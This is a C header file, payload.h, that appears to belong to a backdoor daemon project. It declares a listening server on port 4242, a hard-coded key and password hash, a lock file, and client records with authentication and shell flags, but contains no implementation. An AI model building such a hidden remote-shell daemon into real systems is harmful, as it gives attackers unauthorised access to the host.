#ifndef _PAYLOAD_H_
# define _PAYLOAD_H_

# include <unistd.h>
# include <signal.h>
# include <string.h>
# include <stdint.h>
# include <stdlib.h>
# include <pthread.h>
# include <elf.h>
# include <fcntl.h>
# include <dirent.h>

# include <sys/stat.h>
# include <sys/wait.h>
# include <sys/types.h>
# include <sys/file.h>
# include <sys/stat.h>
# include <sys/mman.h>

# define SRV_PORT 4242
# define MAXMSG 256
# define MAXCLIENT 3

# define PATH_FILE_LOCK "/var/lock/payload.lock"

# define KEY 4242
# define PASSWD_HASH 0x17c7a6ed1

typedef int SOCKET;

typedef struct			s_client
{
	uint8_t		auth;
	uint8_t		shell;
	SOCKET		sock;
	pthread_t	thread;
	pid_t		pid;
}				t_client;

typedef struct			s_client_connect
{
	t_client		client[MAXCLIENT];
	fd_set			active_fd;
	SOCKET			sock_monitoring;
	uint8_t			nb_client;
	pthread_mutex_t		mut_sock_monitoring;
	pthread_mutex_t		mut_nb_client;
}				t_client_connect;

/*------------------ lock_daemon ------------------*/
int		lock_daemon(int *fd);
void		unlock_deamon(int *fd);
/*------------------ cred_daemon ------------------*/
int		check_credentials(void);
/*------------------ sig_daemon -------------------*/
int		create_server(void);
int		run_server(const int *sock);

#endif
